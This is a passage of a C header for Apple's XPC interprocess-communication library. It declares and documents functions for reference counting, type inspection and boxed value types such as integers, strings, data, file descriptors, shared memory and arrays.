#define XPC_TYPE_RICH_ERROR (&_xpc_type_rich_error)
XPC_EXPORT
XPC_TYPE(_xpc_type_rich_error);
XPC_DECL(xpc_rich_error);

XPC_ASSUME_NONNULL_END
#if !defined(__XPC_BUILDING_XPC__) || !__XPC_BUILDING_XPC__
#include <xpc/endpoint.h>
#include <xpc/debug.h>
#if __BLOCKS__
#include <xpc/activity.h>
#include <xpc/connection.h>
#include <xpc/rich_error.h>
#include <xpc/session.h>
#endif // __BLOCKS__
#undef __XPC_INDIRECT__
#include <launch.h>
#endif // !defined(__XPC_BUILDING_XPC__) || !__XPC_BUILDING_XPC__
XPC_ASSUME_NONNULL_BEGIN

#pragma mark XPC Object Protocol
/*!
 * @function xpc_retain
 *
 * @abstract
 * Increments the reference count of an object.
 *
 * @param object
 * The object which is to be manipulated.
 *
 * @result
 * The object which was given.
 *
 * @discussion
 * Calls to xpc_retain() must be balanced with calls to xpc_release()
 * to avoid leaking memory.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
xpc_object_t
xpc_retain(xpc_object_t object);
#if OS_OBJECT_USE_OBJC_RETAIN_RELEASE
#undef xpc_retain
#define xpc_retain(object) ({ xpc_object_t _o = (object); \
		_xpc_object_validate(_o); [_o retain]; })
#endif // OS_OBJECT_USE_OBJC_RETAIN_RELEASE

/*!
 * @function xpc_release
 *
 * @abstract
 * Decrements the reference count of an object.
 *
 * @param object
 * The object which is to be manipulated.
 *
 * @discussion
 * The caller must take care to balance retains and releases. When creating or
 * retaining XPC objects, the creator obtains a reference on the object. Thus,
 * it is the caller's responsibility to call xpc_release() on those objects when
 * they are no longer needed.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_release(xpc_object_t object);
#if OS_OBJECT_USE_OBJC_RETAIN_RELEASE
#undef xpc_release
#define xpc_release(object) ({ xpc_object_t _o = (object); \
		_xpc_object_validate(_o); [_o release]; })
#endif // OS_OBJECT_USE_OBJC_RETAIN_RELEASE

/*!
 * @function xpc_get_type
 *
 * @abstract
 * Returns the type of an object.
 *
 * @param object
 * The object to examine.
 *
 * @result
 * An opaque pointer describing the type of the object. This pointer is suitable
 * direct comparison to exported type constants with the equality operator.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT
xpc_type_t
xpc_get_type(xpc_object_t object);

/*!
 * @function xpc_type_get_name
 *
 * @abstract
 * Returns a string describing an XPC object type.
 *
 * @param type
 * The type to describe.
 *
 * @result
 * A string describing the type of an object, like "string" or "int64".
 * This string should not be freed or modified.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_15, __IPHONE_13_0)
XPC_EXPORT XPC_NONNULL1
const char *
xpc_type_get_name(xpc_type_t type);

/*!
 * @function xpc_copy
 *
 * @abstract
 * Creates a copy of the object.
 *
 * @param object
 * The object to copy.
 *
 * @result
 * The new object. NULL if the object type does not support copying or if
 * sufficient memory for the copy could not be allocated. Service objects do
 * not support copying.
 *
 * @discussion
 * When called on an array or dictionary, xpc_copy() will perform a deep copy.
 *
 * The object returned is not necessarily guaranteed to be a new object, and
 * whether it is will depend on the implementation of the object being copied.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT XPC_RETURNS_RETAINED
xpc_object_t _Nullable
xpc_copy(xpc_object_t object);

/*!
 * @function xpc_equal
 *
 * @abstract
 * Compares two objects for equality.
 *
 * @param object1
 * The first object to compare.
 *
 * @param object2
 * The second object to compare.
 *
 * @result
 * Returns true if the objects are equal, otherwise false. Two objects must be
 * of the same type in order to be equal.
 *
 * For two arrays to be equal, they must contain the same values at the 
 * same indexes. For two dictionaries to be equal, they must contain the same
 * values for the same keys.
 *
 * Two objects being equal implies that their hashes (as returned by xpc_hash())
 * are also equal.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2 XPC_WARN_RESULT
bool
xpc_equal(xpc_object_t object1, xpc_object_t object2);

/*!
 * @function xpc_hash
 *
 * @abstract
 * Calculates a hash value for the given object.
 *
 * @param object
 * The object for which to calculate a hash value. This value may be modded
 * with a table size for insertion into a dictionary-like data structure.
 *
 * @result
 * The calculated hash value.
 *
 * @discussion
 * Note that the computed hash values for any particular type and value of an 
 * object can change from across releases and platforms and should not be
 * assumed to be constant across all time and space or stored persistently.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_WARN_RESULT
size_t
xpc_hash(xpc_object_t object);

/*!
 * @function xpc_copy_description
 *
 * @abstract
 * Copies a debug string describing the object.
 *
 * @param object
 * The object which is to be examined.
 *
 * @result
 * A string describing object which contains information useful for debugging.
 * This string should be disposed of with free(3) when done.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_WARN_RESULT XPC_NONNULL1
char *
xpc_copy_description(xpc_object_t object);

#pragma mark XPC Object Types
#pragma mark Null
/*!
 * @function xpc_null_create
 *
 * @abstract
 * Creates an XPC object representing the null object.
 *
 * @result
 * A new null object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_null_create(void);

#pragma mark Boolean
/*!
 * @function xpc_bool_create
 *
 * @abstract
 * Creates an XPC Boolean object.
 *
 * @param value
 * The Boolean primitive value which is to be boxed.
 *
 * @result
 * A new Boolean object. 
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_bool_create(bool value);

/*!
 * @function xpc_bool_get_value
 *
 * @abstract
 * Returns the underlying Boolean value from the object.
 *
 * @param xbool
 * The Boolean object which is to be examined.
 *
 * @result
 * The underlying Boolean value or false if the given object was not an XPC
 * Boolean object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
bool
xpc_bool_get_value(xpc_object_t xbool);

#pragma mark Signed Integer
/*!
 * @function xpc_int64_create
 *
 * @abstract
 * Creates an XPC signed integer object.
 *
 * @param value
 * The signed integer value which is to be boxed.
 *
 * @result
 * A new signed integer object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_int64_create(int64_t value);

/*!
 * @function xpc_int64_get_value
 *
 * @abstract
 * Returns the underlying signed 64-bit integer value from an object.
 *
 * @param xint
 * The signed integer object which is to be examined.
 *
 * @result
 * The underlying signed 64-bit value or 0 if the given object was not an XPC
 * integer object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
int64_t
xpc_int64_get_value(xpc_object_t xint);

#pragma mark Unsigned Integer
/*!
 * @function xpc_uint64_create
 *
 * @abstract
 * Creates an XPC unsigned integer object.
 *
 * @param value
 * The unsigned integer value which is to be boxed.
 *
 * @result
 * A new unsigned integer object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_uint64_create(uint64_t value);

/*!
 * @function xpc_uint64_get_value
 *
 * @abstract
 * Returns the underlying unsigned 64-bit integer value from an object.
 *
 * @param xuint
 * The unsigned integer object which is to be examined.
 *
 * @result
 * The underlying unsigned integer value or 0 if the given object was not an XPC
 * unsigned integer object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
uint64_t
xpc_uint64_get_value(xpc_object_t xuint);

#pragma mark Double
/*!
 * @function xpc_double_create
 *
 * @abstract
 * Creates an XPC double object.
 *
 * @param value
 * The floating point quantity which is to be boxed.
 *
 * @result
 * A new floating point object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_double_create(double value);

/*!
 * @function xpc_double_get_value
 *
 * @abstract
 * Returns the underlying double-precision floating point value from an object.
 *
 * @param xdouble
 * The floating point object which is to be examined.
 *
 * @result
 * The underlying floating point value or NAN if the given object was not an XPC
 * floating point object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
double
xpc_double_get_value(xpc_object_t xdouble);

#pragma mark Date
/*!
 * @function xpc_date_create
 *
 * @abstract
 * Creates an XPC date object.
 *
 * @param interval
 * The date interval which is to be boxed. Negative values indicate the number
 * of nanoseconds before the epoch. Positive values indicate the number of
 * nanoseconds after the epoch.
 *
 * @result
 * A new date object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_date_create(int64_t interval);

/*!
 * @function xpc_date_create_from_current
 *
 * @abstract
 * Creates an XPC date object representing the current date.
 *
 * @result
 * A new date object representing the current date.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_date_create_from_current(void);

/*!
 * @function xpc_date_get_value
 *
 * @abstract
 * Returns the underlying date interval from an object.
 *
 * @param xdate
 * The date object which is to be examined.
 *
 * @result
 * The underlying date interval or 0 if the given object was not an XPC date
 * object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
int64_t
xpc_date_get_value(xpc_object_t xdate);

#pragma mark Data
/*!
 * @function xpc_data_create
 *
 * @abstract
 * Creates an XPC object representing buffer of bytes.
 *
 * @param bytes
 * The buffer of bytes which is to be boxed. You may create an empty data object
 * by passing NULL for this parameter and 0 for the length. Passing NULL with
 * any other length will result in undefined behavior.
 *
 * @param length
 * The number of bytes which are to be boxed.
 *
 * @result
 * A new data object. 
 *
 * @discussion
 * This method will copy the buffer given into internal storage. After calling
 * this method, it is safe to dispose of the given buffer.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_data_create(const void * _Nullable XPC_SIZEDBY(length) bytes, size_t length);

/*!
 * @function xpc_data_create_with_dispatch_data
 *
 * @abstract
 * Creates an XPC object representing buffer of bytes described by the given GCD
 * data object.
 *
 * @param ddata
 * The GCD data object containing the bytes which are to be boxed. This object
 * is retained by the data object.
 *
 * @result
 * A new data object. 
 *
 * @discussion
 * The object returned by this method will refer to the buffer returned by
 * dispatch_data_create_map(). The point where XPC will make the call to
 * dispatch_data_create_map() is undefined.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL1
xpc_object_t
xpc_data_create_with_dispatch_data(dispatch_data_t ddata);

/*!
 * @function xpc_data_get_length
 *
 * @abstract
 * Returns the length of the data encapsulated by an XPC data object.
 *
 * @param xdata
 * The data object which is to be examined.
 *
 * @result
 * The length of the underlying boxed data or 0 if the given object was not an
 * XPC data object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
size_t
xpc_data_get_length(xpc_object_t xdata);

/*!
 * @function xpc_data_get_bytes_ptr
 *
 * @abstract
 * Returns a pointer to the internal storage of a data object.
 *
 * @param xdata
 * The data object which is to be examined.
 *
 * @result
 * A pointer to the underlying boxed data or NULL if the given object was not an
 * XPC data object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
const void * _Nullable
xpc_data_get_bytes_ptr(xpc_object_t xdata);

/*!
 * @function xpc_data_get_bytes
 *
 * @abstract
 * Copies the bytes stored in an data objects into the specified buffer.
 *
 * @param xdata
 * The data object which is to be examined.
 *
 * @param buffer
 * The buffer in which to copy the data object's bytes.
 *
 * @param off
 * The offset at which to begin the copy. If this offset is greater than the 
 * length of the data element, nothing is copied. Pass 0 to start the copy
 * at the beginning of the buffer.
 *
 * @param length
 * The length of the destination buffer.
 *
 * @result
 * The number of bytes that were copied into the buffer or 0 if the given object
 * was not an XPC data object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1 XPC_NONNULL2
size_t
xpc_data_get_bytes(xpc_object_t xdata, 
	void *buffer, size_t off, size_t length);

#pragma mark String
/*!
 * @function xpc_string_create
 *
 * @abstract
 * Creates an XPC object representing a NUL-terminated C-string.
 *
 * @param string
 * The C-string which is to be boxed.
 *
 * @result
 * A new string object. 
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL1
xpc_object_t
xpc_string_create(const char *string);

/*!
 * @function xpc_string_create_with_format
 *
 * @abstract
 * Creates an XPC object representing a C-string that is generated from the
 * given format string and arguments.
 *
 * @param fmt
 * The printf(3)-style format string from which to construct the final C-string
 * to be boxed.
 *
 * @param ...
 * The arguments which correspond to those specified in the format string.
 *
 * @result
 * A new string object. 
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL1
XPC_PRINTF(1, 2)
xpc_object_t
xpc_string_create_with_format(const char *fmt, ...);

/*!
 * @function xpc_string_create_with_format_and_arguments
 *
 * @abstract
 * Creates an XPC object representing a C-string that is generated from the
 * given format string and argument list pointer.
 *
 * @param fmt
 * The printf(3)-style format string from which to construct the final C-string
 * to be boxed.
 *
 * @param ap
 * A pointer to the arguments which correspond to those specified in the format
 * string.
 *
 * @result
 * A new string object. 
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL1
XPC_PRINTF(1, 0)
xpc_object_t
xpc_string_create_with_format_and_arguments(const char *fmt, va_list ap);

/*!
 * @function xpc_string_get_length
 *
 * @abstract
 * Returns the length of the underlying string.
 *
 * @param xstring
 * The string object which is to be examined.
 *
 * @result
 * The length of the underlying string, not including the NUL-terminator, or 0 
 * if the given object was not an XPC string object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
size_t
xpc_string_get_length(xpc_object_t xstring);

/*!
 * @function xpc_string_get_string_ptr
 *
 * @abstract
 * Returns a pointer to the internal storage of a string object.
 *
 * @param xstring
 * The string object which is to be examined.
 *
 * @result
 * A pointer to the string object's internal storage or NULL if the given object
 * was not an XPC string object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
const char * _Nullable
xpc_string_get_string_ptr(xpc_object_t xstring);

#pragma mark UUID
/*!
 * @function xpc_uuid_create
 *
 * @abstract
 * Creates an XPC object representing a universally-unique identifier (UUID) as
 * described by uuid(3).
 *
 * @param uuid
 * The UUID which is to be boxed.
 *
 * @result
 * A new UUID object. 
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL1
xpc_object_t
xpc_uuid_create(const uuid_t XPC_NONNULL_ARRAY uuid);

/*!
 * @function xpc_uuid_get_bytes
 *
 * @abstract
 * Returns a pointer to the the boxed UUID bytes in an XPC UUID object.
 *
 * @param xuuid
 * The UUID object which is to be examined.
 * 
 * @result
 * The underlying <code>uuid_t</code> bytes or NULL if the given object was not
 * an XPC UUID object. The returned pointer may be safely passed to the uuid(3)
 * APIs.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
const uint8_t * _Nullable
xpc_uuid_get_bytes(xpc_object_t xuuid);

#pragma mark File Descriptors
/*!
 * @function xpc_fd_create
 *
 * @abstract
 * Creates an XPC object representing a POSIX file descriptor.
 *
 * @param fd
 * The file descriptor which is to be boxed.
 *
 * @result
 * A new file descriptor object. NULL if sufficient memory could not be
 * allocated or if the given file descriptor was not valid.
 *
 * @discussion
 * This method performs the equivalent of a dup(2) on the descriptor, and thus
 * it is safe to call close(2) on the descriptor after boxing it with a file
 * descriptor object.
 *
 * IMPORTANT: Pointer equality is the ONLY valid test for equality between two
 * file descriptor objects. There is no reliable way to determine whether two
 * file descriptors refer to the same inode with the same capabilities, so two
 * file descriptor objects created from the same underlying file descriptor
 * number will not compare equally with xpc_equal(). This is also true of a
 * file descriptor object created using xpc_copy() and the original.
 *
 * This also implies that two collections containing file descriptor objects
 * cannot be equal unless the exact same object was inserted into both.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t _Nullable
xpc_fd_create(int fd);

/*!
 * @function xpc_fd_dup
 *
 * @abstract
 * Returns a file descriptor that is equivalent to the one boxed by the file
 * file descriptor object.
 *
 * @param xfd
 * The file descriptor object which is to be examined.
 *
 * @result
 * A file descriptor that is equivalent to the one originally given to
 * xpc_fd_create(). If the descriptor could not be created or if the given 
 * object was not an XPC file descriptor, -1 is returned.
 *
 * @discussion
 * Multiple invocations of xpc_fd_dup() will not return the same file descriptor
 * number, but they will return descriptors that are equivalent, as though they
 * had been created by dup(2).
 *
 * The caller is responsible for calling close(2) on the returned descriptor.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
int
xpc_fd_dup(xpc_object_t xfd);

#pragma mark Shared Memory
/*!
 * @function xpc_shmem_create
 *
 * @abstract
 * Creates an XPC object representing the given shared memory region.
 *
 * @param region
 * A pointer to a region of shared memory, created through a call to mmap(2)
 * with the MAP_SHARED flag, which is to be boxed.
 *
 * @param length
 * The length of the region.
 *
 * @result
 * A new shared memory object.
 *
 * @discussion
 * Only memory regions whose exact characteristics are known to the caller
 * should be boxed using this API. Memory returned from malloc(3) may not be
 * safely shared on either OS X or iOS because the underlying virtual memory
 * objects for malloc(3)ed allocations are owned by the malloc(3) subsystem and
 * not the caller of malloc(3).
 *
 * If you wish to share a memory region that you receive from another subsystem,
 * part of the interface contract with that other subsystem must include how to
 * create the region of memory, or sharing it may be unsafe.
 *
 * Certain operations may internally fragment a region of memory in a way that
 * would truncate the range detected by the shared memory object. vm_copy(), for
 * example, may split the region into multiple parts to avoid copying certain
 * page ranges. For this reason, it is recommended that you delay all VM
 * operations until the shared memory object has been created so that the VM
 * system knows that the entire range is intended for sharing.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL1
xpc_object_t
xpc_shmem_create(void *region, size_t length);

/*!
 * @function xpc_shmem_map
 *
 * @abstract
 * Maps the region boxed by the XPC shared memory object into the caller's
 * address space.
 *
 * @param xshmem
 * The shared memory object to be examined.
 *
 * @param region
 * On return, this will point to the region at which the shared memory was
 * mapped.
 *
 * @result
 * The length of the region that was mapped. If the mapping failed or if the
 * given object was not an XPC shared memory object, 0 is returned. The length 
 * of the mapped region will always be an integral page size, even if the
 * creator of the region specified a non-integral page size.
 *
 * @discussion
 * The resulting region must be disposed of with munmap(2).
 *
 * It is the responsibility of the caller to manage protections on the new
 * region accordingly. 
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
size_t
xpc_shmem_map(xpc_object_t xshmem, void * _Nullable * _Nonnull region);

#pragma mark Array
/*!
 * @typedef xpc_array_applier_t
 * A block to be invoked for every value in the array.
 *
 * @param index
 * The current index in the iteration.
 *
 * @param value
 * The current value in the iteration.
 *
 * @result
 * A Boolean indicating whether iteration should continue.
 */
#ifdef __BLOCKS__
typedef bool (^xpc_array_applier_t)(size_t index, xpc_object_t _Nonnull value);
#endif // __BLOCKS__ 

/*!
 * @function xpc_array_create
 *
 * @abstract
 * Creates an XPC object representing an array of XPC objects.
 *
 * @discussion
 * This array must be contiguous and cannot contain any NULL values. If you
 * wish to insert the equivalent of a NULL value, you may use the result of
 * {@link xpc_null_create}.
 *
 * @param objects
 * An array of XPC objects which is to be boxed. The order of this array is
 * preserved in the object. If this array contains a NULL value, the behavior
 * is undefined. This parameter may be NULL only if the count is 0.
 *
 * @param count
 * The number of objects in the given array. If the number passed is less than
 * the actual number of values in the array, only the specified number of items
 * are inserted into the resulting array. If the number passed is more than
 * the the actual number of values, the behavior is undefined.
 *
 * @result
 * A new array object. 
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_array_create(
	const xpc_object_t _Nonnull *XPC_COUNTEDBY(count) _Nullable objects,
	size_t count);

/*!
 * @function xpc_array_create_empty
 *
 * @abstract
 * Creates an XPC object representing an array of XPC objects.
 *
 * @result
 * A new array object.
 *
 * @see
 * xpc_array_create
 */
API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0))
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_array_create_empty(void);

/*!
 * @function xpc_array_set_value
 *
 * @abstract
 * Inserts the specified object into the array at the specified index.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array).
 * If the index is outside that range, the behavior is undefined.
 * 
 * @param value
 * The object to insert. This value is retained by the array and cannot be
 * NULL. If there is already a value at the specified index, it is released,
 * and the new value is inserted in its place.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL3
void
xpc_array_set_value(xpc_object_t xarray, size_t index, xpc_object_t value);

/*!
 * @function xpc_array_append_value
 *
 * @abstract
 * Appends an object to an XPC array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param value
 * The object to append. This object is retained by the array.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2
void
xpc_array_append_value(xpc_object_t xarray, xpc_object_t value);

/*!
 * @function xpc_array_get_count
 *
 * @abstract
 * Returns the count of values currently in the array.
 *
 * @param xarray
 * The array object which is to be examined.
 *
 * @result
 * The count of values in the array or 0 if the given object was not an XPC 
 * array.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
size_t
xpc_array_get_count(xpc_object_t xarray);

/*!
 * @function xpc_array_get_value
 *
 * @abstract
 * Returns the value at the specified index in the array.
 *
 * @param xarray
 * The array object which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the range of
 * indexes as specified in xpc_array_set_value().
 * 
 * @result
 * The object at the specified index within the array or NULL if the given
 * object was not an XPC array.
 *
 * @discussion
 * This method does not grant the caller a reference to the underlying object,
 * and thus the caller is not responsible for releasing the object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL
xpc_object_t
xpc_array_get_value(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_apply
 *
 * @abstract
 * Invokes the given block for every value in the array.
 *
 * @param xarray
 * The array object which is to be examined.
 *
 * @param applier
 * The block which this function applies to every element in the array.
 * 
 * @result
 * A Boolean indicating whether iteration of the array completed successfully.
 * Iteration will only fail if the applier block returns false.
 *
 * @discussion
 * You should not modify an array's contents during iteration. The array indexes
 * are iterated in order.
 */
#ifdef __BLOCKS__
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL
bool
xpc_array_apply(xpc_object_t xarray, XPC_NOESCAPE xpc_array_applier_t applier);
#endif // __BLOCKS__ 

#pragma mark Array Primitive Setters
/*!
 * @define XPC_ARRAY_APPEND
 * A constant that may be passed as the destination index to the class of
 * primitive XPC array setters indicating that the given primitive should be
 * appended to the array.
 */
#define XPC_ARRAY_APPEND ((size_t)(-1))

/*!
 * @function xpc_array_set_bool
 *
 * @abstract
 * Inserts a <code>bool</code> (primitive) value into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param value
 * The <code>bool</code> value to insert. After calling this method, the XPC
 * object corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_array_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_array_set_bool(xpc_object_t xarray, size_t index, bool value);

/*!
 * @function xpc_array_set_int64
 *
 * @abstract
 * Inserts an <code>int64_t</code> (primitive) value into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param value
 * The <code>int64_t</code> value to insert. After calling this method, the XPC
 * object corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_array_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_array_set_int64(xpc_object_t xarray, size_t index, int64_t value);

/*!
 * @function xpc_array_set_uint64
 *
 * @abstract
 * Inserts a <code>uint64_t</code> (primitive) value into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param value
 * The <code>uint64_t</code> value to insert. After calling this method, the XPC
 * object corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_array_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_array_set_uint64(xpc_object_t xarray, size_t index, uint64_t value);

/*!
 * @function xpc_array_set_double
 *
 * @abstract
 * Inserts a <code>double</code> (primitive) value into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param value
 * The <code>double</code> value to insert. After calling this method, the XPC
 * object corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_array_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_array_set_double(xpc_object_t xarray, size_t index, double value);

/*!
 * @function xpc_array_set_date
 *
 * @abstract
 * Inserts a date value into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param value
 * The date value to insert, represented as an <code>int64_t</code>. After 
 * calling this method, the XPC object corresponding to the primitive value 
 * inserted may be safely retrieved with {@link xpc_array_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_array_set_date(xpc_object_t xarray, size_t index, int64_t value);

/*!
 * @function xpc_array_set_data
 *
 * @abstract
 * Inserts a raw data value into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param bytes
 * The raw data to insert. After calling this method, the XPC object
 * corresponding to the primitive value inserted may be safely retrieved with
 * {@link xpc_array_get_value()}.
 *
 * @param length
 * The length of the data.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL3
void
